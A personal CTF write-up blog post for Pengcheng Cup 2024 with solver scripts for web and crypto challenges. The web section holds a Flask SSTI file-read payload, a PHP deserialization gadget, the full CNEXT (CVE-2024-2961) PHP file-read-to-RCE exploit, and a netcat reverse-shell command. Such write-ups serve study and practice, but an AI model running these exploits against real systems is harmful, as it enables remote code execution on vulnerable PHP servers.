+++
title = 'Pengcheng Cup 2024 Personal Writeup'
date = 2024-11-10T14:37:06+08:00
summary = "Can those 'OFFICIAL' CTFs be any more boring?"
math = true
draft = false
tags = ['Writeup', 'Hackergame']
categories = ['CTF']
+++

> 非常ex的赤石体验。做了两道web和三道crypto，因为大多是原题。。。

## Web

### python口算

直接curl下来算，然后Flask SSTI，随便找个模版链就打上去了。username的参数是post有点难崩。

```python
import requests

url = "http://192.168.18.28/calc"
username = "{{x.__init__.__globals__['__builtins__'].open('/flag','r').read()}}"
answer = eval(requests.get(url).text)
submit = f'http://192.168.18.28/?answer={answer}&Submit=Submit'

data = {
    "username": username
}

print(requests.post(submit, data=data).text)
```

### fileread

index.php 改了用来序列化。然后`/proc/self/maps`和`/etc/passwd`能读，但是`/flag`读不了。没有什么思路。

```php
<?php
class cls1{
    var $cls;
    var $arr;
    function show(){
        show_source(__FILE__);
    }
    function __wakeup(){
        foreach($this->arr as $k => $v)
            echo $this->cls->$v;
    }
}
class cls2{
    var $filename = 'hello.php';
    var $txt = '';
    function __get($key){
           var_dump($key);
        if($key == 'fileput')
            return $this->fileput();
        else
            return '<p>'.htmlspecialchars($key).'</p>';
    }
    function fileput(){
        echo 'Your file:'.file_get_contents($this->filename);
    }
}

$c = new cls1();
$c->cls = new cls2();
$c->cls->filename = 'PATHHERE';
$c->arr = array('fileput');

echo serialize($c);
?>
```

网上搜到了今年的CVE，CNEXT的漏洞。~一个Web题为什么会有PWN。。~

```python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        php = open("index.php", "r").read().replace("PATHHERE", path)
        open("tmp.php", "w").write(php)
        payload = subprocess.run(["php", "-f", "tmp.php"], capture_output=True).stdout
        payload = __import__('base64').b64encode(payload).decode()
        print(payload)
        return self.session.get(self.url + f"?ser={payload}")
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        data = response.re.search(b"Your file:(.*)", flags=re.S).group(1)
        return base64.decode(data)

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "/tmp/cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
```

然后执行命令

```bash
python3 cnext-exploit.py http://192.168.18.24/ "nc -vv <IP> <PORT>"
```

不知道是不是reverse shell命令写错了，shell没弹回来，而且最后半小时做的所以来不及了。。

## Crypto

### ezrsa
[附件](attachments/ezrsa.py)

angstromCTF 2024 blahaj原题。由$xy = a p^2 + b q^2 = dp + cq$，然后 $xy - dp - cq = 0$

因为$p, q$ 是 $n$ 的一半，所以LLL可解

```python
c = 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925
n = 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777
y = 9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604
x = 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317

e = 0x10001

R = Integers(n)

P.<a, b, p, q> = PolynomialRing(Integers(n))

f1 = a*p + q
f2 = p + b*q
f3 = p*q

I = Ideal([f1 - x, f2 - y, f3 - n])
B = I.groebner_basis()
g = B[-1]
z = ZZ(g.coefficient({q: 1}))
assert g.constant_coefficient() == R(-y)

_, (z1, _), (z2, _) = list(g)
z1 = ZZ(z1)
z2 = ZZ(z2)
S = 2^1024

for p_upper_bits in range(16):
	p_upper = p_upper_bits << 1020
	for q_upper_bits in range(16):
		q_upper = q_upper_bits << 1020
		M = matrix(ZZ, [[S, -1, 0, 0], [S*z1, 0, -1, 0], [S*(z2 + p_upper + q_upper*z1), 0, 0, S], [S*n, 0, 0, 0]])
		B = M.LLL()
		for b in B:
			if b[-1] == S:
				if b[1] < 0:
					b *= -1

				p_guess = b[1] + p_upper
				q_guess = b[2] + q_upper
				if p_guess * q_guess == n:
					d = pow(e, -1, (p_guess - 1)*(q_guess - 1))
					print(int(pow(c, d, n)).to_bytes(1024//8, 'big'))
					exit()
```

## enc
[附件](attachments/enc.py)

Yet another 原题。

```python
from Crypto.Util.number import *

e = [43, 37, 53, 61, 59]
c = [304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117, 300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224, 294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531, 255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835, 194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978]
n = 16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067
c2 = [12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364, 13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932]

knlist = []
for i in range(4):
    knlist.append(c[i]**e[i+1] - c[i+1]**e[i])

for i in range(3):
    kn = gcd(knlist[i],knlist[i+1])

print(long_to_bytes(kn>>310))

PR.<m> = PolynomialRing(Zmod(n))
f = m^2 - (c2[0]+c2[1])*m + c2[0]*c2[1]
x0 = f.small_roots()

print(long_to_bytes(int(x0[0])))
```

### polyprime
[附件](attachments/prime.py)

```python
from Crypto.Util.number import *

n = 659401821142664131364043958430747314465977448744532421905138184036743766362324320051729418680079590835903781525157600055608268591994754328563246418114269690475272262915661210669701969695314157602927462228079044905276064391615467601628466982949165371933147600418057089432876120807721483665788557812323607370950442342057254926375842684430119320789097029996211564275310819486004520088130146630452262340185192110066151930586956190499953220051855668474863659201165952231016814569364299000130323859609047687714260776467149437031397019411599103716200258382231589757031469168245396061619327867355414287059363691024984066070128364157490336808211223714816668548049472199794493895870662970541167490686648385211854469386812214775829776376273299648505880034651930322294605482489225723014758138525637864689594748771025870209444029669477294995691067669374491852721622469656239730320092112222948718027850386898461208936333788173263904607181823233002355650353116486156927403178510412091666951574340730799316032588099237
c = 455042981325030540026829365098432813829591020497037525707600104817313008442900331256387443469027825344761381076471749826547710666806180999603254398722965179851898391700090501419875562919365894255855734276825027850795202733875071307773598881254863911398285400038957998385685292965812925607278232164067624548120378758414574370042945538632864154772437639053907149514588502689277630450575630168099810584842881257614115970132960679023265157277718654731105815060916800751033956715430930381384344469220951638102432198422350425390757155267143393385221465041749156153517556389417033187856017198907366720281408810250981776112815100319814215140919133440637395953567624057248002125277569474190364142291136361144552953540727462623677375371327473687508344483184466522697912317252462246054471196345909304668083637177166153036111122244170846815657389873986264187766636830907458940128844256504176917204131708083105093700023335939233711693409336968008112511482237441198116493965744903995545941700742865846469036763734618
e = 0x10001
k = 5

R = Zmod(n)["x"]
while True:
    Q = R.quo(R.random_element(k))
    pp = gcd(ZZ(list(Q.random_element() ^ n)[1]), n)
    if pp != 1:
        qq = sum([pp**i for i in range(k)])
        rr = n // (pp * qq)
        assert n == pp * qq * rr
        break

phi = (pp - 1) * (qq - 1) * (rr - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

### Alice'sSecret
[附件](attachments/cry.py)

伪造和消息`Bob`一样的前面，验证过程为

$$
g^m \equiv y^r r^s \mod (p - 1)
$$

经典El-Gamal，只需要伪造$m^{\prime}$ 使得 $m^{\prime} m = \mod (p-1)$即可。

IV不影响后面的解密，然后png文件头又是固定，就可以解出来。

```python
from Crypto.Util.number import *
from pwn import *
from Crypto.Cipher import AES

p = remote('192.168.18.26', 8888)

p.recvuntil(b'Here are your public key:(')
pub = eval(p.recvuntil(b')')[:-1])

m = b"Bob"

def find(m, public):
    p, g, y = public
    return m + (p - 1)

p.sendline(str(find(bytes_to_long(m), pub)).encode())

p.recvuntil(b'r = ')
r = eval(p.recvline())
p.recvuntil(b's = ')
s = eval(p.recvline())
p.sendline(str(r).encode())
p.sendline(str(s).encode())

p.recvuntil(b'Here is my encoded data:')
c = bytes.fromhex(p.recvline().strip().decode())
p.recvuntil(b'key:')
k = p.recv(16)

print(k)

png_header = bytes.fromhex('89504e470d0a1a0a0000000d49484452')
cipher = AES.new(k, AES.MODE_CBC)
m = cipher.decrypt(c)
m = png_header + m[16:]
with open('result.png', 'wb') as f:
    f.write(m)

p.interactive()
```

![](attachment/result.png)

### rickroll
[附件](attachments/rickroll.zip)

已知$p = 2q + 1$, $p, q$都是素数，然后又有$ S_i = (V_i * hint + R_i \oplus key) \bmod (p-1) $, 给了S, V 和 R。

因为$R_0$和$R_4$，$V_0$和$V_4$，$R_1$和$R_3$的padding一样，可以得到key的值的近似值。

低92bit为0，然后LLL可以解出hint了。

```sage
from Crypto.Util.number import *

S = [624073892368439332713131144655355187273652775732037030273908973687487472640419, 1129513550732743550887354593625951854836036688324123410864182971141396110133306, 1117643028354341949186759218964558582164677605237787761003042032239935547551873, 151619055620013230556169740951169935393567570823439146992800622058967940011364, 596106506159944398847755500086869373163910176213091804211992440336880292610397, 685472210701608040945173323626153641749419080165879222271110177606156013942182]
V = [100024809269721744282017864103544473542698741247649693420201028956644193231147, 85493218764912449360009112267171851264674952927507787108286827385372626006804, 75451455656190167222034904545925816909383290106210237096763781707294423744719, 1864420400658866895837249178680154965580281261003086054650703872439476331244, 111069754111223622246512532174936637994215526100226395068812327641951277359169, 88031405587803201423744918486788030404029698214504194443110805396831023823738]
n = 1497114501625523578039715607844306226528709444454126120151416887663514076507099

p = n // 2

M = matrix(ZZ, [
    [1, 0, (S[0]-S[4])*inverse_mod(2^92,p)%p,(S[1]-S[3])*inverse_mod(2^92,p)%p],
    [0, 1, (V[0]-V[4])*inverse_mod(2^92,p)%p,(V[1]-V[3])*inverse_mod(2^92,p)%p],
    [0, 0, p, 0],
    [0, 0, 0, p]
])

bits = [0, 256, 84, 84]
weights = [2^(256-i) for i in bits]
M = (M * diagonal_matrix(weights)).LLL()
h = abs((M * diagonal_matrix(weights)^-1)[1, 1])
print(long_to_bytes(int(h)))
```

最后再根据提示md5一下拿到flag。
